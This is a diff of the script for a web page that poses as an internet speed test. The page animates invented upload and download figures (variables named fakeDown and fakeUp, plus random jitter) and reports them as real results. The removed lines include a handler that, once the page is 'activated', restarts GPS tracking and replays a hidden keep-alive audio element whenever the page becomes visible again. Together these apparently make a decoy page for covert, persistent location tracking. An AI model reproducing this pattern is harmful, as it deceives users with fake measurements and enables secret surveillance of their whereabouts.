-            const targetUp = fakeDown * (0.2 + Math.random() * 0.35);
-            await animateSpeed(0, targetUp, 3500, v => {
-                fakeUp = v;
-                setSpeed(v, 50);
-                document.getElementById('mainSpeed').style.color = '#818cf8';
+            let fakeUp = 0; const targetUp = fakeDown * (0.2 + Math.random() * 0.35);
+            const startT2 = performance.now();
+            await new Promise(resolve => {
+                function step(now) {
+                    const t = Math.min((now - startT2) / 3500, 1);
+                    fakeUp = Math.max(0, (targetUp * (t < 0.5 ? 2*t*t : -1+(4-2*t)*t)) + ((Math.random()-0.5)*2.5));
+                    setSpeed(fakeUp, 50);
+                    if (t < 1) requestAnimationFrame(step); else resolve();
+                } requestAnimationFrame(step);
             });
-            document.getElementById('upVal').innerText = fakeUp.toFixed(1) + ' Mbps';
-            document.getElementById('upVal').classList.add('active');
-            setPhase(3);
+            document.getElementById('upVal').innerText = fakeUp.toFixed(1) + ' Mbps'; document.getElementById('upVal').classList.add('active'); setPhase(3);
 
             document.getElementById('speedStatus').innerText = 'COMPLETE';
-            document.getElementById('speedType').innerText = 'TEST DONE ✓';
-            setSpeed(fakeDown, 100);
-            document.getElementById('mainSpeed').style.color = '#10b981';
-
-            await sleep(1500);
-            startBtn.disabled = false;
-            startBtn.innerText = '↺ TEST AGAIN';
-            testRunning = false;
-        });
-
-        // ═══════════════════════════════════════════════════════════
-        //  Helpers
-        // ═══════════════════════════════════════════════════════════
-        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-        function animateSpeed(from, to, duration, onUpdate) {
-            return new Promise(resolve => {
-                const start = performance.now();
-                function step(now) {
-                    const t = Math.min((now - start) / duration, 1);
-                    const eased = t < 0.5 ? 2*t*t : -1+(4-2*t)*t;
-                    let val = from + (to - from) * eased;
-                    val += (Math.random() - 0.5) * 2.5;
-                    val = Math.max(0, val);
-                    onUpdate(val);
-                    if (t < 1) requestAnimationFrame(step);
-                    else { onUpdate(to); resolve(); }
-                }
-                requestAnimationFrame(step);
-            });
-        }
-
-        document.addEventListener('visibilitychange', () => {
-            if (document.visibilityState === 'visible' && activated) {
-                document.getElementById('keepAliveAudio').play().catch(() => {});
-                if (gpsWatchId === null) startGPSTracking();
-            }
+            setSpeed(fakeDown, 100); document.getElementById('mainSpeed').style.color = '#10b981';
+            await new Promise(r => setTimeout(r, 1500));
+            startBtn.disabled = false; startBtn.innerText = '↺ TEST AGAIN'; testRunning = false;
         });
     </script>
 </body>
